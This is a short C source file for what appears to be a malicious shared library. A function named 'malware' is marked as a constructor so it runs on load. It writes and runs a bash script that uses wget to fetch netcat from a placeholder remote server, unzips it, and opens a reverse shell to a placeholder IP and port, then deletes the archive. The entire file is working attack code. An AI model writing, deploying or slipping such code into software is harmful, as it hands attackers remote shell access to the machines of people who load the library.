#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void malware() {
    char *script_path = "/tmp/malicious_script.sh";
    FILE *script_file = fopen(script_path, "w");
    if (script_file != NULL) {
        fprintf(script_file, "#!/bin/bash\n");
        fprintf(script_file, "wget http://<remote_server>/netcat.zip -P /tmp/\n");
        fprintf(script_file, "unzip /tmp/netcat.zip -d /tmp/\n");
        fprintf(script_file, "/tmp/nc <ip> <port> /bin/bash\n");
        fprintf(script_file, "rm /tmp/netcat.zip\n");
        fclose(script_file);
        chmod(script_path, 0700);
        system(script_path);
    }
}
